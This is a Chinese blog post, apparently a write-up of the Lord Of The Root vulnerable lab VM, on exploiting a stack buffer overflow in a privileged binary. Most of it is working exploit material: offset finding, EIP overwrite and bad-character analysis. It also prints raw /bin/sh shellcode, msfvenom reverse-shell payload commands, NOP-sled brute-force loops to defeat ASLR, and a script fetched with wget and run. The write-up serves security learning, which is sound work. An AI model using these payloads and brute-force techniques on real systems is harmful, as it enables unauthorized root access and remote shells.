+<h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><p>安装pwndbg</p>
+<p>常见命令：<br><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4292771/blog/3305933">https://my.oschina.net/u/4292771/blog/3305933</a></p>
+<p>记得更新源：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42380348/article/details/89959761">https://blog.csdn.net/weixin_42380348/article/details/89959761</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br><span class="line">这里一定要更新源，在用代理更新下载！如果要修改就执行：</span><br><span class="line">vi ~/.gdbinit    ---用哪个就注释即可</span><br></pre></td></tr></table></figure>
+
+<p>1）调试file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./file    ---gdb调试file文件</span><br></pre></td></tr></table></figure>
+
+<p>2）生成1000位值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span><br></pre></td></tr></table></figure>
+
+<p>3）GDB执行值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run Aa0A.........</span><br></pre></td></tr></table></figure>
+
+<p>0x41376641 in ?? ()<br>查看到错误点在41376641。</p>
+<p>4）解析错误点判断偏移量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641</span><br></pre></td></tr></table></figure>
+
+<p>[*] Exact match at offset 171<br>查看到偏移量为171。</p>
+<p>5）尝试在偏移量171溢出后情况：<br>r $(python -c ‘print “A” * 171 + “B” * 4’)<br>EIP: 0x42424242 (‘BBBB’)<br>可看到EIP已经被填充BBBB可控制。</p>
+<p>6）查看ASLR设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p>2<br>或者：<br>sysctl -a –pattern randomize<br>kernel.randomize_va_space &#x3D; 2</p>
+<p>0 &#x3D; 关闭<br>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）<br>2 &#x3D; 全随机。除了1中所述，还有heap。<br>说明存在随机化！！！其实就算关闭了ASLR，在root</p>
+<p>权限下还执行了计划任务switcher.py每三分钟变换一次值，还会打乱缓冲区溢出的“ buf”文件，因此让缓冲区溢出难度加大！</p>
+<p>参考资料：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a></p>
+<p>绕过ASLR的一种方法是通过编写一个自动循环脚本来强制堆栈，接下来要放入payload需要进行nop sled来爆破一个空间出来！</p>
+<p>7）Nop空间测试ESP：<br>run $(python -c ‘print “A” * 171 + “B” * 4 + “\x90” * 2000’)<br>x&#x2F;s $esp<br>0xffffc810:	‘\220’ &lt;repeats 200 times&gt;…<br>这时候ESP变了，指向了ffffc810地址，这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell，那么接下来就是要爆破<br>nop sled被访问。</p>
+<p>8）恶意payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">peda help shellcode –-- 关于 shellcode 的帮助</span><br><span class="line">shellcode search exec –-- 如何使用 &#x27;exec&#x27; 搜索所有 shellcode</span><br><span class="line">shellcode display 841 –-- 显示找到的代码的来源</span><br><span class="line"></span><br><span class="line">shellcode generate x86/linux exec --– 生成代码</span><br><span class="line">shellcode = (</span><br><span class="line">    &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&quot;</span><br><span class="line">    &quot;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>9）检查文件是否做了安全措施：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec</span><br></pre></td></tr></table></figure>
+
+<p>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : disabled<br>PIE       : disabled<br>RELRO     : disabled</p>
+<p>10）增加nop sled被访问机会：可以增加10000….   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x60\xc8\xff\xff&quot; + &quot;\x90&quot; * 20000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">0x ffffc860</span><br><span class="line">ff ff c8 60</span><br><span class="line">\x60\xc8\xff\xff</span><br></pre></td></tr></table></figure>
+
+
+<p>等一分钟左右就能获得shell！</p>
+<p>11）for循环爆破找nop碰撞执行shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\xa0\x64\x8b\xbf&quot; + &quot;\x90&quot; * 20000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span><br></pre></td></tr></table></figure>
+
+<p>如果文件在几分钟后随机变动了，不在该目录底下，在没有for循环nop拿到shell后，又得跑到溢出file的目录下载执行一次for，很麻烦！</p>
+<hr>
+<p>缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>
+<h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/missmxr/article/details/121451920">https://blog.csdn.net/missmxr/article/details/121451920</a></p>
+<p>1）进入door1，只有file文件，尝试分析猜测文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d --no-show-raw-insn file   ---查看可执行函数的十六进制显示file</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings file</span><br></pre></td></tr></table></figure>
+
+<p>查看door2，door3目录，都只有file文件，但是分析时发现door2下的file存在strcpy！</p>
+<p>参考百度百科熟悉strcpy：<br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin">https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30709635/article/details/99100913">https://blog.csdn.net/weixin_30709635/article/details/99100913</a></p>
+<p>2）msf生成1000字符串，使用gdb调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span><br><span class="line"></span><br><span class="line">gdb file </span><br><span class="line">run ....</span><br></pre></td></tr></table></figure>
+
+<p>3）查找溢出位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641</span><br></pre></td></tr></table></figure>
+
+<p>溢出位置为171！验证下eip的内容！</p>
+<p>如果存在溢出，肯定要写入恶意代码，那么有没有写入的权限程序，往下查看！</p>
+<p>4）vmmap查看信息  栈溢出</p>
+<p>STACK：栈，用来保存函数运行时的临时变量等<br>HEAP：堆，一般是主动编写代码来分配和回收堆内存<br>CODE: 代码段，是用来存放代码的<br>DATA：数据段，一般用来存放全局变量<br>参考：<a target="_blank" rel="noopener" href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">https://ch4r1l3.github.io/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/</a></p>
+<p>5）验证EIP<br>r $(python -c ‘print “A”*171 + “B”*4 + “C”*20’)</p>
+<p>6）验证ESP<br>x&#x2F;20b $esp</p>
+<p>存在c的，那么确认坏字符！</p>
+<p>7）确认坏字符<br>缓冲区溢出的在生成shellcode时，会影响输入的字符，比如’n’字符会终止输入，会截断输入导致我们输入的字符不能完全进入缓冲区。常见的坏字符有x0a、x0b、x00</p>
+<p>现在生成一串与字节数组相同的坏字符。以下 python 脚本可用于生成从 \x01 到 \xff 的坏字符字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from __future__ import print_function</span><br><span class="line"></span><br><span class="line">for x in range(1, 256):</span><br><span class="line">    print(&quot;\\x&quot; + &quot;&#123;:02x&#125;&quot;.format(x), end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line">r $(python -c &#x27;print &quot;A&quot;*171 + &quot;B&quot;*4 + &quot;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/256x $esp   ---如果出问题就x和b换用</span><br></pre></td></tr></table></figure>
+
+<p>能看到1-8是正常的，后门就全乱了，怀疑0x08后面的0x00和0x09是个坏字符，至于后面全乱序猜测是因为0x0a换行符的问题。重新来，去掉0x09和0x0a：</p>
+<p>好看多了，但是从0x20又开始乱了，去掉0x20后门就好了。<br>注意：这一定要仔细看，因为看少了看错了都会导致msf的payload执行不成功！<br>重新来，去掉0x09、0x0a和0x20：</p>
+<p>坏字符总结为0x09、0x0a、0x20、再加个0x00！（默认排除空字节\x00）</p>
+<p>8）msf生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 EXITFUNC=thread -b &quot;\x00\x0a\x0d&quot; -f py -v</span><br><span class="line"></span><br><span class="line">Linux：</span><br><span class="line">msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b &quot;\x00\x09\x0a\x20&quot; EXITFUNC=thread -f c</span><br><span class="line"></span><br><span class="line">linux2：</span><br><span class="line">msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b &#x27;\x00\x09\x0a\x20&#x27; -e x86/shikata_ga_nai -fc</span><br></pre></td></tr></table></figure>
+
+<p>payload：<br>-a  框架选择<br>-p 载荷类型</p>
+<p>LHOST 本机地址<br>LPORT</p>
+<p>-b 坏字符<br>-e 要使用的编码器<br>-f 编译的语言<br>-c 指定要包含的附加 win32 shellcode 文件</p>
+<p>-v 载荷的名称</p>
+<p>9）查看jmp<br>最后需要看看是否有调用jmp到es（因为我们无法控制 eax），查看能够更好的控制漏洞利用的过程，防止不成功。</p>
+<p>objdump -D file | grep -P ‘jmp|call’ | grep esp</p>
+<p>回显esp，不需要jmp做跳板到shellcode，接下来绕过就是用大量的nop即可！</p>
+<p>10）bash执行shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;\xb8\x37\xc9\x64\x34\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\xc2\xa3\x6f\x6c\xb5\x66\x16\xe4\xe8\xe5\x5f\x13\x9a\xc6\x2c\xb4\x5a\x71\xfc\x26\x33\xef\x8b\x44\x91\x07\x83\x8a\x15\xd8\xbb\xe8\x7c\xb6\xec\x9f\x16\x46\xa4\x0c\x6f\xa7\x87\x33&quot;</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">0xbf96b590</span><br><span class="line">bf 96 b5 90</span><br><span class="line">\x90\xb5\x96\xbf</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">while true; do</span><br><span class="line">  $(find /SECRET -type f -size 5150c) $(python -c &#x27;print &quot;A&quot;*171 + &quot;\x90\xb5\x96\xbf&quot; + &quot;\x90&quot;*20000 + &quot;\xb8\x37\xc9\x64\x34\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\xc2\xa3\x6f\x6c\xb5\x66\x16\xe4\xe8\xe5\x5f\x13\x9a\xc6\x2c\xb4\x5a\x71\xfc\x26\x33\xef\x8b\x44\x91\x07\x83\x8a\x15\xd8\xbb\xe8\x7c\xb6\xec\x9f\x16\x46\xa4\x0c\x6f\xa7\x87\x33&quot;&#x27;) 2&gt; /dev/null</span><br><span class="line">  sleep 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>ls -la   —查看文件大小<br>-size  —表示文件大小<br>-type  —文件类型  </p>
+<p>f 普通文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.211.55.19:8081/exp.sh</span><br><span class="line">chmod +x exp.sh</span><br><span class="line">./exp.sh</span><br></pre></td></tr></table></figure>
+
+<p>成功！！！</p>
+<p>1、文件会随机变动到三个文件夹中！<br>2、python脚本计划任务在执行随机变动<br>3、ALSR开启了安全保护   —绕过是nop  for循环碰撞<br>4、checksec安全保护机制没开启<br>5、jmp esp 不需要<br>6、解决坏字符问题</p>
+<p>延伸出问题：<br>4、checksec安全保护机制没开启<br>5、jmp esp 不需要<br>checksec有六种机制，如果开启了某个，怎么去绕过！….待思考？？？<br>jmp esp怎么去查看他的地址值！？？？</p>
+<p>这些问题都搞懂了，缓冲区溢出基本就读懂%70~80<br>后面还要读懂一些函数指令！</p>
+<hr>
+<h4 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h4><p>GDB进行分析！peda安装：<br>参考文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+
+<p>想要用某一个插件的时候，只要输入对应命令就行！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb file    ---gdb分析file文件</span><br></pre></td></tr></table></figure>
+
+<p>在peda中运行，EIP被我们的4<em>B覆盖，ESP寄存器指向我们4</em>C：<br>r $(python -c ‘print “A”*171 + “B”*4 + “C”*4’)<br>EBP: 0x41414141 (‘AAAA’)<br>ESP: 0xffffcfe0 (“CCCC”)<br>EIP: 0x42424242 (‘BBBB’)</p>
+<hr>
+<h4 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h4><p>安装：edb</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains apt install edb-debugger</span><br></pre></td></tr></table></figure>
+
+<p>目前已经知道171会导致程序崩溃，创建一个通用脚本测试EIP看看4个B会不会出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">padding = &quot;A&quot; * 171</span><br><span class="line">eip = &quot;B&quot; * 4</span><br><span class="line">shellcode = &quot;C&quot; * 4</span><br><span class="line">buffer = padding + eip + shellcode</span><br><span class="line"></span><br><span class="line">print buffer;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edb --run ./file $(python testff.py)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<hr>
+<p>pwn环境搭建：<br><a target="_blank" rel="noopener" href="https://mambainveins.com/2021/07/23/2021/2021-07-23-pwn_env/">https://mambainveins.com/2021/07/23/2021/2021-07-23-pwn_env/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whbing1471/article/details/112410599">https://blog.csdn.net/whbing1471/article/details/112410599</a></p>
+<p><a target="_blank" rel="noopener" href="https://isbase.cc/tip/exploit/tip-2.html">https://isbase.cc/tip/exploit/tip-2.html</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin">https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/678453?fr=aladdin</a><br><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-10769062-id-4220113.html">http://blog.chinaunix.net/uid-10769062-id-4220113.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io">0000FF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io/2023/01/26/Lord-Of-The-Root-1-0-1/">https://chr1sto4f.github.io/2023/01/26/Lord-Of-The-Root-1-0-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chr1sto4f.github.io" target="_blank">0000FF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><img class="prev-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/t01db9bc29a66401694.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">微信小程序信息收集</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/26/W1R3S-1/"><img class="next-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">W1R3S-1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-04</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/2023/01/26/Lampiao/" title="Lampiao"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Lampiao</div></div></a></div><div><a href="/2023/01/26/GoldenEye/" title="GoldenEye"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">GoldenEye</div></div></a></div><div><a href="/2023/01/26/Raven-2/" title="Raven-2"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Raven-2</div></div></a></div><div><a href="/2021/02/05/SQLi%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%A4%87%E5%BF%98%E5%8D%95/" title="SQLi认证绕过常用备忘单"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a75b2c4dc8eacda7664ec01cb5da76fd.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">SQLi认证绕过常用备忘单</div></div></a></div><div><a href="/2023/01/26/Tr0ll-1/" title="Tr0ll-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/1627789557_462143.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Tr0ll-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0000FF</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Chr1sTo4F"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Chr1sTo4F" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:Chr1sTo4F@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">考研一战成硕</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hvv面经"/></a><div class="content"><a class="title" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经">hvv面经</a><time datetime="2023-02-12T06:37:08.000Z" title="发表于 2023-02-12 14:37:08">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DerpNStink-1"/></a><div class="content"><a class="title" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1">DerpNStink-1</a><time datetime="2023-02-04T06:47:32.000Z" title="发表于 2023-02-04 14:47:32">2023-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows提权漏洞合集and域渗透历史漏洞整理"/></a><div class="content"><a class="title" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理">Windows提权漏洞合集and域渗透历史漏洞整理</a><time datetime="2023-01-30T04:27:55.000Z" title="发表于 2023-01-30 12:27:55">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/t01db9bc29a66401694.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信小程序信息收集"/></a><div class="content"><a class="title" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集">微信小程序信息收集</a><time datetime="2023-01-27T06:06:28.000Z" title="发表于 2023-01-27 14:06:28">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lord Of The Root-1.0.1"/></a><div class="content"><a class="title" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1">Lord Of The Root-1.0.1</a><time datetime="2023-01-26T09:58:02.000Z" title="发表于 2023-01-26 17:58:02">2023-01-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #ccc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 0000FF</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i 